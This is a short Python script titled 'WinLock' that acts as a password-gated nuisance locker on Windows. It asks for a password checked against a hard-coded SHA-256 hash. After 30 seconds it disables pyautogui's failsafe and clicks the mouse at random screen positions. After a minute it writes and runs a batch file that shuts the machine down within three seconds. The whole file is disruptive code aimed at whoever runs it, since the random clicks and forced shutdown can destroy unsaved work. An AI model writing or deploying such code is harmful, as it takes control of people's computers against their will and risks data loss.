# -*- coding: utf-8 -*-
# Environment    PyCharm
# File_name   WinLock |User    Pfolg
# 2024/7/15   22:01
import sys
import time
import pygame
import pyautogui
import random
import os
import hashlib
import threading

pygame.init()
a, b = pygame.display.Info().current_w, pygame.display.Info().current_h
pyautogui.PAUSE = 0.5
pyautogui.FAILSAFE = False


def shutDown():
    text = "shutdown -s -t 3"
    with open(r".\auto_shutdown.bat", "w", encoding="utf-8") as file:
        file.write(text)
    os.system(r".\auto_shutdown.bat")
    os.remove(r".\auto_shutdown.bat")


def outChoice():
    j = 0
    while True:
        if j < 3:
            key = pyautogui.prompt(f"请输入密码，已用{j}次机会，共3次")
            if not key:
                pyautogui.alert(f"密码错误，您还有{2 - j}次机会")
                j += 1
                continue
            elif hashlib.sha256(
                    key.encode()).hexdigest() == "fa65d94b3532d83fd24ada92dadecfc7ae5370e6dbf762133027a89c2e7202f1":
                sys.exit()
            else:
                pyautogui.alert(f"密码错误，您还有{2 - j}次机会")
            j += 1
        else:
            j = 3


def disturbMouse():
    while True:
        x = random.randint(0, a)
        y = random.randint(0, b - 60)
        pyautogui.click(x, y)


def mainProcess():
    start = time.perf_counter()
    i = 0
    while True:
        end = time.perf_counter()
        timeChange = int(end - start)
        if i == 0:
            process1.start()
            i = 1
        elif not process1.is_alive():
            sys.exit()
        elif 30 < timeChange < 60 and i == 1:
            process2.start()
            i = 2
        elif timeChange > 60 and i == 2:
            process3.start()
            i = 3


process1 = threading.Thread(target=outChoice)
process2 = threading.Thread(target=disturbMouse)
process3 = threading.Thread(target=shutDown)

if __name__ == '__main__':
    mainProcess()
